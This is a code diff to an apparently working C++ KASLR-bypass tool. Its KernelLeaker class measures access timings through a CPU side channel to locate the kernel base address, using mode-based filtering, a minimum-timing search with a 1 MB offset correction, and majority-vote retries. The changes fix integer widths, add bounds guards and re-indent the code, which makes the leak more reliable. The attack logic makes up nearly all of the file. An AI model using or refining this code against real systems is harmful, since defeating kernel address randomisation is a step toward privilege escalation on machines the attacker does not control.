@@ -75,6 +75,8 @@ namespace kaslr {
     }
 
     int KernelLeaker::average_sidechannel(void* addr) const {
+        // INTENTIONAL: bad_syscall() performs kernel transition to flush CPU state
+        // This is NOT a bug - it stabilizes microarchitectural state between measurements
         bad_syscall();
         uint64_t total = sidechannel(addr);
         
@@ -111,86 +113,96 @@ namespace kaslr {
         return data;
     }
 
-	// Optimized O(N) implementation using hash map
-	// Replaces the previous O(N²) nested loop approach
-	uint64_t KernelLeaker::calculate_most_frequent(
-		const std::array<uint64_t, config::ARRAY_SIZE>& data)
-	{
-		// Hash map stores: [timing_value] -> [occurrence_count]
-		// Using unordered_map for O(1) average access time via hashing
-		std::unordered_map<uint64_t, size_t> frequency_map;
-		
-		// Track the current "champion" - the most frequent value seen so far
-		uint64_t max_count = 0;
-		uint64_t most_frequent_value = 0;
+    // Optimized O(N) implementation using hash map
+    // Replaces the previous O(N²) nested loop approach
+    uint64_t KernelLeaker::calculate_most_frequent(
+        const std::array<uint64_t, config::ARRAY_SIZE>& data)
+    {
+        // Hash map stores: [timing_value] -> [occurrence_count]
+        // Using unordered_map for O(1) average access time via hashing
+        std::unordered_map<uint64_t, size_t> frequency_map;
+        frequency_map.reserve(data.size()); // Pre-allocate to avoid expensive rehashing
+        
+        // Track the current "champion" - the most frequent value seen so far
+        size_t max_count = 0;
+        uint64_t most_frequent_value = 0;
 
-		// Single pass through the data - O(N) complexity
-		for (const auto& timing : data) {
-			// Increment counter for this timing value and get the new count
-			// operator[] creates entry with default value (0) if key doesn't exist
-			// Pre-increment returns the new value immediately
-			size_t current_count = ++frequency_map[timing];
-			
-			// Check if this value just became the new record holder
-			// This happens in real-time as we process the data
-			if (current_count > max_count) {
-				max_count = current_count;
-				most_frequent_value = timing;
-			}
-		}
+        // Single pass through the data - O(N) complexity
+        for (const auto& timing : data) {
+            // Increment counter for this timing value and get the new count
+            // operator[] creates entry with default value (0) if key doesn't exist
+            // Pre-increment returns the new value immediately
+            size_t current_count = ++frequency_map[timing];
+            
+            // Check if this value just became the new record holder
+            // This happens in real-time as we process the data
+            if (current_count > max_count) {
+                max_count = current_count;
+                most_frequent_value = timing;
+            }
+        }
 
-		return most_frequent_value;
-	}
+        return most_frequent_value;
+    }
 
     // NEW: Simple Intel leak that finds address with absolute minimum timing
     // This works because kernel base typically has the lowest access latency
-	std::optional<uint64_t> KernelLeaker::leak_intel_simple() const {
-		auto data = collect_timings();
-		
-		// Find address with ABSOLUTE MINIMUM timing
-		uint64_t min_timing = ~0ull;
-		uint64_t best_addr = 0;
-		size_t best_index = 0;
-		
-		for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
-			if (data[i] < min_timing) {
-				min_timing = data[i];
-				best_addr = index_to_address(i);
-				best_index = i;
-			}
-		}
-		
-		if (verbose_) {
-			std::cout << std::format("Absolute minimum: {} cycles at {:p} (index: {})\n", 
-				min_timing, reinterpret_cast<void*>(best_addr), best_index);
-			
-			// Debug: show nearby addresses to verify we found a cluster
-			std::cout << "Nearby addresses for verification:\n";
-			size_t start = (best_index > 5) ? best_index - 5 : 0;
-			size_t end = best_index + 10;
-			if (end > config::ARRAY_SIZE) {
-				end = config::ARRAY_SIZE;
-			}
+    std::optional<uint64_t> KernelLeaker::leak_intel_simple() const {
+        auto data = collect_timings();
+        
+        // Find address with ABSOLUTE MINIMUM timing
+        uint64_t min_timing = ~0ull;
+        uint64_t best_addr = 0;
+        size_t best_index = 0;
+        
+        for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
+            if (data[i] < min_timing) {
+                min_timing = data[i];
+                best_addr = index_to_address(i);
+                best_index = i;
+            }
+        }
+        
+        if (verbose_) {
+            std::cout << std::format("Absolute minimum: {} cycles at {:p} (index: {})\n", 
+                min_timing, reinterpret_cast<void*>(best_addr), best_index);
+            
+            // Debug: show nearby addresses to verify we found a cluster
+            std::cout << "Nearby addresses for verification:\n";
+            size_t start = (best_index > 5) ? best_index - 5 : 0;
+            size_t end = best_index + 10;
+            if (end > config::ARRAY_SIZE) {
+                end = config::ARRAY_SIZE;
+            }
 
-			for (size_t i = start; i < end; ++i) {
-				std::cout << std::format("  {:p}: {} cycles{}\n", 
-					reinterpret_cast<void*>(index_to_address(i)), 
-					data[i],
-					(i == best_index) ? " [MINIMUM]" : "");
-			}
-		}
-		
-		// FIX: Subtract 1MB offset to get the true kernel base
-		// The minimum timing is often 1MB after the actual kernel base
-		uint64_t corrected_addr = best_addr - 0x100000;
-		
-		if (verbose_) {
-			std::cout << std::format("Corrected kernel base: {:p} (original minimum: {:p})\n",
-				reinterpret_cast<void*>(corrected_addr), reinterpret_cast<void*>(best_addr));
-		}
-		
-		return corrected_addr;
-	}
+            for (size_t i = start; i < end; ++i) {
+                std::cout << std::format("  {:p}: {} cycles{}\n", 
+                    reinterpret_cast<void*>(index_to_address(i)), 
+                    data[i],
+                    (i == best_index) ? " [MINIMUM]" : "");
+            }
+        }
+        
+        // Subtract 1MB offset to get the true kernel base
+        // The minimum timing is often 1MB after the actual kernel base
+        constexpr uint64_t OFFSET = 0x100000;
+        if (best_addr < config::KERNEL_LOWER_BOUND + OFFSET) {
+            if (verbose_) {
+                std::cout << "Warning: Minimum address too close to lower bound, "
+                          << "returning without correction\n";
+            }
+            return best_addr;
+        }
+        
+        uint64_t corrected_addr = best_addr - OFFSET;
+        
+        if (verbose_) {
+            std::cout << std::format("Corrected kernel base: {:p} (original minimum: {:p})\n",
+                reinterpret_cast<void*>(corrected_addr), reinterpret_cast<void*>(best_addr));
+        }
+        
+        return corrected_addr;
+    }
 
     // Intel-specific leak using mode-based noise filtering
     // Intel exhibits LOWER timings for mapped kernel pages (fast speculative prefetch)
@@ -198,7 +210,7 @@ namespace kaslr {
         auto data = collect_timings();
 
         // Use mode instead of mean - robust against outliers in bimodal distribution
-        avg_timing_ = static_cast<uint32_t>(calculate_most_frequent(data));
+        avg_timing_ = calculate_most_frequent(data);
 
         // Clamp outliers to average (noise reduction)
         for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
@@ -217,12 +229,12 @@ namespace kaslr {
             std::cout << std::format("avg for all: {}\n", avg_timing_);
         }
 
-        const uint32_t thresh_1 = avg_timing_ / 10;
-        const uint32_t thresh_2 = avg_timing_ / 30;
+        const uint64_t thresh_1 = avg_timing_ / 10;
+        const uint64_t thresh_2 = avg_timing_ / 30;
 
         // Search for consecutive low-timing sections (kernel mapping signature)
         for (size_t i = 0; i < config::ARRAY_SIZE - config::KERNEL_SECTIONS; ++i) {
-            uint32_t section_avg = 0;
+            uint64_t section_avg = 0;
             bool section_valid = true;
 
             for (size_t x = 0; x < config::KERNEL_SECTIONS; ++x) {
@@ -230,12 +242,12 @@ namespace kaslr {
                     section_valid = false;
                     break;
                 }
-                section_avg += static_cast<uint32_t>(data[i + x]);
+                section_avg += data[i + x];
             }
 
             if (!section_valid) continue;
 
-            section_avg /= static_cast<uint32_t>(config::KERNEL_SECTIONS);
+            section_avg /= config::KERNEL_SECTIONS;
             
             if (verbose_) {
                 std::cout << std::format("{:p} cur_avg: {}\n", 
@@ -258,7 +270,7 @@ namespace kaslr {
         for (const auto& timing : data) {
             total += timing;
         }
-        avg_timing_ = static_cast<uint32_t>(total / config::ARRAY_SIZE);
+        avg_timing_ = total / config::ARRAY_SIZE;
 
         for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
             if (i == 0) continue;
@@ -276,12 +288,16 @@ namespace kaslr {
             std::cout << std::format("avg for all: {}\n", avg_timing_);
         }
 
-        const uint32_t threshold = avg_timing_ / 3;
+        // Use simple threshold to detect significantly lower timings
+        const uint64_t delta = std::max<uint64_t>(1, avg_timing_ / 10);
 
         // Look for consecutive measurements significantly below average
         for (size_t i = 0; i < config::ARRAY_SIZE - 2; ++i) {
-            if (data[i] < avg_timing_ - (avg_timing_ / threshold) &&
-                data[i + 1] < avg_timing_ - (avg_timing_ / threshold))
+            // Skip early indices to avoid underflow when applying offset correction
+            if (i < 9) continue;
+            
+            if (data[i] < avg_timing_ - delta &&
+                data[i + 1] < avg_timing_ - delta)
             {
                 return index_to_address(i - 9);
             }
@@ -306,7 +322,7 @@ namespace kaslr {
 
         // Extract signal timings (values significantly above noise floor)
         std::vector<uint64_t> signal_timings;
-        const uint32_t noise_threshold = static_cast<uint32_t>(noise_peak / 6);
+        const uint64_t noise_threshold = noise_peak / 6;
         
         for (size_t i = 0; i < config::ARRAY_SIZE; ++i) {
             if (data[i] > noise_peak + noise_threshold) {
@@ -334,7 +350,7 @@ namespace kaslr {
         for (const auto& timing : signal_timings) {
             signal_total += timing;
         }
-        uint32_t signal_avg = static_cast<uint32_t>(signal_total / signal_timings.size());
+        uint64_t signal_avg = signal_total / signal_timings.size();
         
         if (verbose_) {
             std::cout << std::format("Signal average: {} (from {} measurements)\n", 
@@ -350,7 +366,7 @@ namespace kaslr {
 
         // Search for consecutive high-timing sections
         for (size_t i = 0; i < config::ARRAY_SIZE - config::KERNEL_SECTIONS; ++i) {
-            uint32_t section_avg = 0;
+            uint64_t section_avg = 0;
             bool section_valid = true;
 
             for (size_t x = 0; x < config::KERNEL_SECTIONS; ++x) {
@@ -365,12 +381,12 @@ namespace kaslr {
                         reinterpret_cast<void*>(index_to_address(i + x)), data[i + x]);
                 }
                 
-                section_avg += static_cast<uint32_t>(data[i + x]);
+                section_avg += data[i + x];
             }
 
             if (!section_valid) continue;
 
-            section_avg /= static_cast<uint32_t>(config::KERNEL_SECTIONS);
+            section_avg /= config::KERNEL_SECTIONS;
             
             // Accept section if it matches signal cluster characteristics
             if (section_avg > noise_peak + noise_threshold) {
@@ -437,76 +453,76 @@ namespace kaslr {
         return std::nullopt;
     }
 
-	// Improved reliability wrapper using majority voting instead of strict consecutive matching
-	// Collects multiple samples and returns the most frequently detected address
-	std::optional<uint64_t> KernelLeaker::leak_with_retry(
-		std::optional<uint64_t> (KernelLeaker::*leak_fn)() const) const
-	{
-		constexpr size_t MAX_ATTEMPTS = 7;  // Must be odd for clear majority
-		constexpr size_t REQUIRED_CONSENSUS = 4;  // 4 out of 7 = 57% majority
-		
-		// Hash map tracks: [detected_address] -> [occurrence_count]
-		std::unordered_map<uint64_t, size_t> vote_count;
-		
-		for (size_t attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
-			auto current_leak = (this->*leak_fn)();
-			
-			if (!current_leak) {
-				if (verbose_) {
-					std::cout << std::format("Attempt {}/{}: Leak failed, continuing...\n", 
-						attempt + 1, MAX_ATTEMPTS);
-				}
-				continue;  // Don't count failed attempts, just try again
-			}
-			
-			// Register this vote
-			uint64_t addr = *current_leak;
-			size_t votes = ++vote_count[addr];
-			
-			if (verbose_) {
-				std::cout << std::format("Attempt {}/{}: {:p} (votes: {})\n",
-					attempt + 1, MAX_ATTEMPTS,
-					reinterpret_cast<void*>(addr), votes);
-			}
-			
-			// Early exit if we have clear consensus
-			if (votes >= REQUIRED_CONSENSUS) {
-				if (verbose_) {
-					std::cout << std::format("Consensus reached: {:p} with {}/{} votes\n",
-						reinterpret_cast<void*>(addr), votes, attempt + 1);
-				}
-				return addr;
-			}
-		}
-		
-		// No early consensus - find the winner from all attempts
-		if (vote_count.empty()) {
-			std::cerr << "All leak attempts failed!\n";
-			return std::nullopt;
-		}
-		
-		// Find address with most votes
-		uint64_t winner = 0;
-		size_t max_votes = 0;
-		
-		for (const auto& [addr, votes] : vote_count) {
-			if (votes > max_votes) {
-				max_votes = votes;
-				winner = addr;
-			}
-		}
-		
-		if (verbose_) {
-			std::cout << std::format("\nVoting results after {} attempts:\n", MAX_ATTEMPTS);
-			for (const auto& [addr, votes] : vote_count) {
-				std::cout << std::format("  {:p}: {} votes {}\n",
-					reinterpret_cast<void*>(addr), votes,
-					(addr == winner ? "[WINNER]" : ""));
-			}
-		}
-		
-		return winner;
-	}
+    // Improved reliability wrapper using majority voting instead of strict consecutive matching
+    // Collects multiple samples and returns the most frequently detected address
+    std::optional<uint64_t> KernelLeaker::leak_with_retry(
+        std::optional<uint64_t> (KernelLeaker::*leak_fn)() const) const
+    {
+        constexpr size_t MAX_ATTEMPTS = 7;  // Must be odd for clear majority
+        constexpr size_t REQUIRED_CONSENSUS = 4;  // 4 out of 7 = 57% majority
+        
+        // Hash map tracks: [detected_address] -> [occurrence_count]
+        std::unordered_map<uint64_t, size_t> vote_count;
+        
+        for (size_t attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
+            auto current_leak = (this->*leak_fn)();
+            
+            if (!current_leak) {
+                if (verbose_) {
+                    std::cout << std::format("Attempt {}/{}: Leak failed, continuing...\n", 
+                        attempt + 1, MAX_ATTEMPTS);
+                }
+                continue;  // Don't count failed attempts, just try again
+            }
+            
+            // Register this vote
+            uint64_t addr = *current_leak;
+            size_t votes = ++vote_count[addr];
+            
+            if (verbose_) {
+                std::cout << std::format("Attempt {}/{}: {:p} (votes: {})\n",
+                    attempt + 1, MAX_ATTEMPTS,
+                    reinterpret_cast<void*>(addr), votes);
+            }
+            
+            // Early exit if we have clear consensus
+            if (votes >= REQUIRED_CONSENSUS) {
+                if (verbose_) {
+                    std::cout << std::format("Consensus reached: {:p} with {}/{} votes\n",
+                        reinterpret_cast<void*>(addr), votes, attempt + 1);
+                }
+                return addr;
+            }
+        }
+        
+        // No early consensus - find the winner from all attempts
+        if (vote_count.empty()) {
+            std::cerr << "All leak attempts failed!\n";
+            return std::nullopt;
+        }
+        
+        // Find address with most votes
+        uint64_t winner = 0;
+        size_t max_votes = 0;
+        
+        for (const auto& [addr, votes] : vote_count) {
+            if (votes > max_votes) {
+                max_votes = votes;
+                winner = addr;
+            }
+        }
+        
+        if (verbose_) {
+            std::cout << std::format("\nVoting results after {} attempts:\n", MAX_ATTEMPTS);
+            for (const auto& [addr, votes] : vote_count) {
+                std::cout << std::format("  {:p}: {} votes {}\n",
+                    reinterpret_cast<void*>(addr), votes,
+                    (addr == winner ? "[WINNER]" : ""));
+            }
+        }
+        
+        return winner;
+    }
 
     // Main entry point - dispatches to architecture-specific implementation
     // NOW USES SIMPLE METHOD FOR INTEL CPUs
@@ -548,7 +564,7 @@ namespace kaslr {
             std::cout << std::format("{:016x} {}\n", index_to_address(i), data[i]);
         }
 
-        uint32_t average = static_cast<uint32_t>(total / config::ARRAY_SIZE);
+        uint64_t average = total / config::ARRAY_SIZE;
         std::cout << std::format("avg: {}\n", average);
         std::cout << std::format("min: {} at {:p}\n", min_timing, reinterpret_cast<void*>(min_addr));
     }
